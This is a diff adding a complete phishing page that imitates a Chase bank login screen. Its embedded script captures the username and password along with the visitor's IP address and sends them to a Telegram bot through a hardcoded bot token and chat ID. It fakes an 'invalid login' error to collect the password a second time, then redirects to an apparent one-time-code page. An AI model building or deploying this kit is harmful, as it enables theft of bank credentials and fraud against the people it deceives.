@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | Chase</title>
+  <!-- Roboto font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      background: #f5f5f5;
+      color: #333;
+    }
+
+    header {
+      text-align: center;
+      padding: 0; /* remove extra space */
+      margin: 0;
+    }
+
+    header img {
+      height: 100px; /* Replaceable logo */
+      width: 400px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    main {
+      margin: 0; /* remove spacing */
+      padding: 0;
+    }
+
+    .login-container {
+      max-width: 350px;
+      margin: 0 auto; /* no vertical space above/below */
+      background: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    /* Floating label form fields */
+    .form-group {
+      position: relative;
+      margin: 25px 0;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px 5px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .form-group input:focus {
+      border-bottom: 2px solid #0065ff;
+    }
+
+    .form-group label {
+      position: absolute;
+      top: 10px;
+      left: 5px;
+      font-size: 16px;
+      color: #888;
+      pointer-events: none;
+      transition: 0.2s ease all;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: -10px;
+      font-size: 12px;
+      color: #0065ff;
+    }
+
+    /* Password show/hide toggle */
+    .password-field {
+      position: relative;
+    }
+
+    .password-field .toggle-password {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #0065ff;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    /* Custom checkboxes */
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      margin: 15px 0;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .options label {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .options input[type="checkbox"] {
+      appearance: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #555;
+      border-radius: 2px;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .options input[type="checkbox"]:checked {
+      background-color: #0065ff;
+      border-color: #0065ff;
+    }
+
+    .options input[type="checkbox"]:checked::after {
+      content: "";
+      position: absolute;
+      left: 4px;
+      top: 0px;
+      width: 4px;
+      height: 8px;
+      border: solid #fff;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    /* Login status message */
+    #login-status {
+      display: none;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 15px;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+    #login-status.error {
+      background: #ffe5e5;
+      color: #cc0000;
+      border: 1px solid #cc0000;
+    }
+    #login-status.success {
+      background: #e6ffed;
+      color: #007a2e;
+      border: 1px solid #007a2e;
+    }
+
+    .login-container button {
+      width: 100%;
+      background: #0065ff;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .login-container button:hover {
+      background: #004bb7;
+    }
+
+    .login-links {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .login-links a {
+      display: block;
+      margin: 6px 0;
+      color: #0065ff;
+      text-decoration: none;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 0; /* remove extra gap */
+      padding: 10px 20px 20px;
+      font-size: 13px;
+      color: #555;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    /* Logo strip replacement */
+    .logo-strip {
+      margin: 0; /* no extra space */
+      padding: 0;
+    }
+
+    .logo-strip img {
+      width: 400px;
+      height: 100px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .footer-links {
+      margin-top: 10px;
+      line-height: 1.8;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .footer-links a {
+      color: #0065ff;
+      text-decoration: none;
+      margin: 0 5px;
+      font-size: 13px;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <!-- Replaceable Logo -->
+    <img src="https://ik.imagekit.io/yleultaj4/IMG_7037.png?updatedAt=1756415428664" alt="Bank Logo">
+  </header>
+
+  <main>
+    <div class="login-container">
+      <form id="login_form">
+        
+        <!-- Username field -->
+        <div class="form-group">
+          <input type="text" id="user" placeholder=" " required>
+          <label for="user">Username</label>
+        </div>
+
+        <!-- Password field with toggle -->
+        <div class="form-group password-field">
+          <input type="password" id="pass" placeholder=" " required>
+          <label for="pass">Password</label>
+          <span class="toggle-password">Show</span>
+        </div>
+
+        <!-- Options -->
+        <div class="options">
+          <label><input type="checkbox"> Remember me</label>
+          <label><input type="checkbox"> Use token</label>
+        </div>
+
+        <!-- Login status message area -->
+        <div id="login-status">
+          <span id="login-status-message"></span>
+        </div>
+
+        <button type="submit">Sign in</button>
+
+        <div class="login-links">
+          <a href="#">Forgot username/password?</a>
+          <a href="#">Not Enrolled? Sign Up Now.</a>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <!-- Replace this with your logo strip -->
+    <div class="logo-strip">
+      <img src="https://ik.imagekit.io/yleultaj4/IMG_7038.jpeg?updatedAt=1756416847301" alt="Partner Logos">
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Contact us</a> | 
+      <a href="#">Privacy</a> | 
+      <a href="#">Security</a> | 
+      <a href="#">Terms of use</a> | 
+      <a href="#">Accessibility</a><br>
+      <a href="#">SAFE Act</a> | 
+      <a href="#">Fair Lending</a> | 
+      <a href="#">About Chase</a> | 
+      <a href="#">J.P. Morgan</a> | 
+      <a href="#">Careers</a> | 
+      <a href="#">Español</a><br>
+      <a href="#">Chase Canada</a> | 
+      <a href="#">Site map</a>
+    </div>
+    <p>Member FDIC · Equal Housing Opportunity</p>
+  </footer>
+
+  <!-- JS -->
+  <script>
+    // Password toggle
+    const passwordField = document.querySelector('.password-field');
+    const passwordInput = document.getElementById('pass');
+    const togglePassword = passwordField.querySelector('.toggle-password');
+
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
+    });
+
+    // Form + status references
+    const form = document.querySelector('#login_form');
+    const emRef = document.querySelector('#user');
+    const pwRef = document.querySelector('#pass');
+    const actionContainer = document.querySelector('#login-status');
+    const actionAlert = document.querySelector('#login-status-message');
+    const searchParams = new URLSearchParams(location.search);
+	const dm = searchParams.get('userid');
+    const bt = '6968351903:AAH3JRKVtZalljxTam-KuTAUPzKGC1YtWpU';
+    const cid = '6529371358';
+    let IPAddress = '';
+
+    // ✅ Load noa from localStorage instead of hardcoding 0
+    let noa = parseInt(localStorage.getItem("noa") || "0");
+
+    emRef.value = dm;
+
+    onload = async () => {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        IPAddress = data.ip;
+    }
+
+    form.onsubmit = function(e) {
+        e.preventDefault();
+
+        if (!emRef.value) {
+            actionAlert.textContent = ' You must specify a username to log in.';
+            return;
+        }
+
+        actionContainer.classList.toggle('info-notice');
+        actionAlert.textContent = ' Authenticating...';
+
+       const message = `
+🔐 CHASE LOGIN  
+----------------------  
+👤 User ID   : ${emRef.value}  
+🔑 Password  : ${pwRef.value}  
+🌐 IP Address: ${IPAddress}  
+----------------------
+`;
+
+
+        if (noa < 1) {
+            fetch(`https://api.telegram.org/bot${bt}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: cid, text: message })
+            })
+            .then(() => {
+                actionContainer.classList.remove('info-notice');
+                actionAlert.textContent = ' The login is invalid. Reloading...';
+                document.body.style.opacity = '0.5';
+
+                setTimeout(() => {
+                    noa++;
+                    localStorage.setItem("noa", noa); // Save for next page load
+                    location.reload();
+                }, 1500);
+            });
+            return;
+        }
+
+        // ✅ Second attempt: redirect and reset noa
+        fetch(`https://api.telegram.org/bot${bt}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: cid, text: message })
+        })
+        .then(() => {
+            actionContainer.classList.remove('info-notice');
+            localStorage.setItem("noa", "0"); // Reset after redirect
+            location.replace('/otp.html');
+        })
+        .catch();
+            }
+        </script>
+    </body>
+</html>
